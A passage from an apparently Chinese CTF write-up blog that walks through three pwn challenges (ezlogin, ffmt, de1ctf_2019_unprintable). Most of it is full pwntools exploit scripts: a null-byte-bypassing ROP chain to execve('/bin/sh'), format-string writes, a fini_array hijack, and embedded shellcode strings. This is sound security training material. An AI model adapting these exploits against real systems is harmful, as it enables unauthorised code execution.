cmp     al, 50h <span class="comment">; &#x27;P&#x27;</span></span><br><span class="line">.text:0000000000400C09 77 33                         ja      short loc_400C3E</span><br></pre></td></tr></table></figure><p>主要是如果al&gt;50h的话就会exit，而显然al只有一个字节8位，所以只要刚好当al&#x3D;0的时候即他的低位&lt;&#x3D;50h即可（学到了，还可以这样搞</p><p>接下来就是要思考如何绕过strcpy的\x00截断了，因为我们的rop链显然会有大量的\x00</p><p>如何绕过呢？有一个思路就是先把已经构造好的rop链将\x00都替换成A传进去，然后再一字节一字节更改位\x00</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br></pre></td></tr></table></figure><p>这个脚本主要是绕过\x00截断的，然后他是先把payload的\x00都换成A，然后将payload倒置过来，之后找到第一个\x00将其之后的，即倒置过来看就是找到最后一个\x00将其的之前所有的\x00都替换为A然后输入，之后就是从\x00之前再寻找最后一个\x00一直重复找，就可以将所有的字节输入进去辣，（使我的大脑无限旋转</p><p>之后的rop链就很简单构造了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node5.anna.nssctf.cn&#x27;,29142)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ezlogin&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bamboo/glibc-all-in-one-master/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Max Padding size : 0x100 - 0x150</span></span><br><span class="line"><span class="comment"># Define registers</span></span><br><span class="line">rax = <span class="number">0x4005AF</span></span><br><span class="line">rdi = <span class="number">0x400706</span></span><br><span class="line">rsi = <span class="number">0x410043</span></span><br><span class="line">rdx = <span class="number">0x448C95</span></span><br><span class="line">syscall = <span class="number">0x448D5F</span></span><br><span class="line">bss = <span class="number">0x6BB300</span></span><br><span class="line">main = <span class="number">0x4005C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create func use to replace &#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gadget</span>(<span class="params">content</span>):</span><br><span class="line">    content = content + <span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    content = content[-<span class="number">1</span>::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content)):</span><br><span class="line">        <span class="keyword">if</span> content[i] == <span class="number">0</span>:</span><br><span class="line">            payload = content[i+<span class="number">1</span>:][-<span class="number">1</span>::-<span class="number">1</span>].replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">            padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x108</span></span><br><span class="line">            log.success(<span class="string">&#x27;Payload: &#x27;</span> + (<span class="built_in">str</span>(payload)))</span><br><span class="line">            io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, padding + payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage one</span></span><br><span class="line"><span class="comment"># read(0, 0, bss)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 0代表 read</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># 0 fd</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># 此处无法填写rdx的寄存器与值，因为如果填写了会导致Payload溢出，a1寄存器为58，就会进入exit函数。</span></span><br><span class="line"><span class="comment"># 但是程序在此时的rdx值够存放很多数据，所以存放一个/bin/sh不是什么难事。</span></span><br><span class="line">debug()</span><br><span class="line">Payload = p64(rax) + p64(<span class="number">0</span>) + p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(bss) + p64(syscall) + p64(main)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Stage two</span></span><br><span class="line"><span class="comment"># execve(&#x27;/bin/sh\x00&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 系统调用号 59代表 execve</span></span><br><span class="line"><span class="comment"># rdi 第一参数</span></span><br><span class="line"><span class="comment"># bss /bin/sh 地址</span></span><br><span class="line"><span class="comment"># rsi 第二参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line"><span class="comment"># rdx 第三参数</span></span><br><span class="line"><span class="comment"># 0 NULL</span></span><br><span class="line">Payload = p64(rax) + p64(<span class="number">59</span>) + p64(rdi) + p64(bss) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">gadget(Payload)</span><br><span class="line">Payload = <span class="string">b&#x27;PASSWORD\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;password:&#x27;</span>, Payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="HZNUCTF-2023-preliminary-ffmt"><a href="#HZNUCTF-2023-preliminary-ffmt" class="headerlink" title="[HZNUCTF 2023 preliminary]ffmt"></a>[HZNUCTF 2023 preliminary]ffmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115387.png" alt="image-20240512200725094"></p><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to HCNUCTF!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;, hell0, please say something about yourself~&quot;</span>);</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现一个格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还有一个，程序中有个backdoor，因此想的是改尾巴一个字节到backdoor，因此就能想到第一个格式化字符串漏洞泄露栈地址，然后第二个直接改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./ffmt&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">25151</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your name: \n&#x27;</span>,<span class="string">b&#x27;%11$p&#x27;</span>)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">r(<span class="number">2</span>)</span><br><span class="line">ret_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x140</span>+<span class="number">48</span></span><br><span class="line">leak(<span class="string">&#x27;ret_addr&#x27;</span>,ret_addr)</span><br><span class="line"></span><br><span class="line">pal=<span class="string">b&#x27;%35c%8$hhnaaaaaa&#x27;</span> + p64(ret_addr)</span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">sla(<span class="string">b&#x27;yourself~\n&#x27;</span>,pal)</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>很经典的格式化字符串漏洞</p><blockquote><p>64位格式字符串漏洞的偏移到栈上是从rsp下面一个开始的</p><ul><li>%hhn 写一字节</li><li>%hn 写两字节</li><li>%n 把已经成功输出的字符个数写入对应的整型指针参数所指的变量。将栈上的内容作为地址解析，然后改变这个地址上的内容，写四字节</li><li>%ln 32位写四字节，64位写八字节</li><li>%lln 写八字节</li></ul></blockquote><p>太久没做都着了道了</p><h1 id="de1ctf-2019-unprintable"><a href="#de1ctf-2019-unprintable" class="headerlink" title="de1ctf_2019_unprintable"></a>de1ctf_2019_unprintable</h1><p>本题的环境是libc-2.23.so的，如果版本不一样会导致栈空间不一样不能getshell（一晚上(lll￢ω￢)得来的</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115389.png" alt="image-20240512214109727"></p><h2 id="静态分析-2"><a href="#静态分析-2" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to Ch4r1l3&#x27;s printf test&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your gift: %p\n&quot;</span>, v3);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现给了栈的地址，然后关闭了标准输出流，又有一个非栈上的格式化字符串漏洞（0x601060）（buff拉满了（bushi</p><p>这题考到一个小trick：</p><p>exit会调用<code>dl_fini</code>函数，我们看看<code>dl_fini</code>函数的源码</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115390" alt="img"></p><p>会发现执行的时候调用(l-&gt;l_addr+l-&gt;l_info[DY_FINI_ARRAY]-&gt;d_un.d_ptr)，本来l-&gt;l_addr为0，而l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr指针指向程序中的fini_array段的地址，也就是l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr的值为0x0000000000600DD8</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115391.png" alt="image-20240512224201859" style="zoom:33%;" /><p>这时就通过覆盖I-&gt;I_addr来劫持fini_array的地址</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115392.png" alt="image-20240513202751753"></p><p>执行exit中的调用函数（发现雀氏</p><p>发现栈上<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115393.png" alt="image-20240512224609287"></p><p>有个I-&gt;I_addr的地址，就可以通过改这个地址上的值来偏移</p><blockquote><p>其中可以通过看这个与众不同的颜色可以知道这是来自于ld.so文件里的，而这个地址为什么恰好出现在栈上可能是因为在exit函数中，会通过这个来调用dl_fini函数</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115394.png" alt="image-20240512224709178"></p><p>通过fmtarg查偏移（问就是懒（bushi</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload =tbs(<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(read_addr)</span><br></pre></td></tr></table></figure><p>通过这个便可以二次利用read了</p><p>而第二次的printf得到的栈空间有着成堆的rop链，非常好的进行构造</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115395.png" alt="image-20240513195457206"></p><p>1和2指向的都是栈空间，能实现在栈空间的任意写，而2能实现printf_loop，或者rip的任意写</p><p>有了任意写之后就要用ROP来getshell了</p><p>（在此发现这题的exp有点复杂，因此只做思路上的利用，就不打了（等之后再次遇到相似的题目再进行利用≧ ﹏ ≦</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405142115396.png" alt="image-20240513200455427"></p><p>在libc_csu_init中可以控制rbx rbp r12 r13 r14 r15</p><p>然后有一个rop</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004006E8                 adc     <span class="section">[rbp+48h]</span>, edx</span><br></pre></td></tr></table></figure><p>它的作用是将exp+[rbp+48h]的值之后存储在rbp+48h中（最神奇的地方，第一次利用这种rop</p><p>而其中的edx和rbp都是可以控制的，所以我们就可以实现一次任意写。</p><p>可以看到程序空间里存在stderr,stdin,stdout，它们都指向libc，所以可以修改它们为one_gadget来getshell。</p><p>在关闭aslr的情况下stderr和one_gadget分别为：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">stderr</span> = <span class="number">0</span>x601040  <span class="comment">#0x7ffff7dd2540</span></span><br><span class="line"><span class="attr">one</span>= <span class="number">0</span>x7ffff7afe147<span class="comment">#0x7ffff7a52216 0x7ffff7a5226a  0x7ffff7afd2a4 0x7ffff7afe147</span></span><br></pre></td></tr></table></figure><p>计算偏移修改即可。</p><p>修改完之后再次利用ret2csu传stderr的地址给r12，**最后调用call qword ptr [r12+rbx*8]**拿到shell。</p><p>（非常好的思路让我大脑旋转</p><p>附上完整exp ：（<a href="https://www.anquanke.com/post/id/183859#h2-0">from</a>)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn_debug <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pdbg=pwn_debug(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">pdbg.context.terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">pdbg.local(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pdbg.debug(<span class="string">&quot;2.23&quot;</span>)</span><br><span class="line">pdbg.remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,)</span><br><span class="line"></span><br><span class="line">switch=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> switch==<span class="number">1</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;local&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">2</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> switch==<span class="number">3</span>:</span><br><span class="line">    p=pdbg.run(<span class="string">&quot;remote&quot;</span>)</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))        <span class="comment">#in case that data is an int</span></span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data)) </span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data)) </span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">bp      = <span class="keyword">lambda</span> bkp                :pdbg.bp(bkp)</span><br><span class="line"><span class="comment">#elf=pdbg.elf</span></span><br><span class="line"><span class="comment">#libc=pdbg.libc</span></span><br><span class="line">sh_x86_18=<span class="string">&quot;x6ax0bx58x53x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;x31xc9x6ax0bx58x51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;xf7xe6x50x48xbfx2fx62x69x6ex2fx2fx73x68x57x48x89xe7xb0x3bx0fx05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    pop_rsp=<span class="number">0x40082d</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;This is your gift: &#x27;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(ru(<span class="string">&#x27;n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="comment">#if stack&amp;0xffff&gt;0x2000:</span></span><br><span class="line">    <span class="comment">#   p.close()</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(stack)</span><br><span class="line">    payload1=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c&#x27;</span>+<span class="string">&#x27;%26$hn&#x27;</span></span><br><span class="line">    payload1=payload1.ljust(<span class="number">16</span>,<span class="string">&#x27;x00&#x27;</span>)+p64(<span class="number">0x4007A3</span>)</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    sl(payload1)</span><br><span 